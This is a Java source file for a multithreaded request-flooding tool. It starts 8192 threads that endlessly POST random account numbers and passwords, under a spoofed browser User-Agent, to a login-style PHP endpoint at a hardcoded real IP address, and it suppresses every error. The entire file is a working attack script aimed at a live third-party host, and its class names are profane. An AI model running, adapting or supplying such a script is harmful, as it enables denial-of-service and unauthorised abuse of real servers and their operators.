package com.imkiva.playground.boom;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SuperFucker {
    private static class FuckThread extends Thread {
        private static final String URL = "http://111.231.217.28/2018.php";

        private Random random = new Random();
        private HttpClient client = HttpClient.newBuilder()
                .version(HttpClient.Version.HTTP_1_1)
                .followRedirects(HttpClient.Redirect.ALWAYS)
                .build();

        private long randomAccount() {
            return Math.abs(random.nextLong()) % (9999999999L - 100000000L + 1L);
        }

        private String randomPassword() {
            int cut = Math.abs(random.nextInt()) % (7);
            return UUID.randomUUID().toString()
                    .replaceAll("-", "")
                    .substring(0, 16)
                    .substring(cut);
        }

        private int doPost(long account, String password) throws IOException, InterruptedException {
            String postData = String.format("user=%s&pass=%s&submit=",
                    account, password);

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(URL))
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .headers("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36")
                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3")
                    .timeout(Duration.ofSeconds(5))
                    .POST(HttpRequest.BodyPublishers.ofString(postData))
                    .build();

            return client.send(request, HttpResponse.BodyHandlers.discarding())
                    .statusCode();
        }

        @Override
        public void run() {
            while (true) {
                long account = randomAccount();
                String password = randomPassword();
                try {
                    int result = doPost(account, password);

                    System.out.println(String.format("[Thread-#%d]: Post status: %d",
                            Thread.currentThread().getId(), result));

                    Thread.sleep(500);
                } catch (Throwable ignore) {
                }
            }
        }
    }

    public static void main(String[] args) {
        final int THREAD_COUNT = 8192;

        ExecutorService executorService = Executors.newFixedThreadPool(THREAD_COUNT);
        for (int i = 0; i < THREAD_COUNT; i++) {
            executorService.submit(new FuckThread());
        }
    }
}
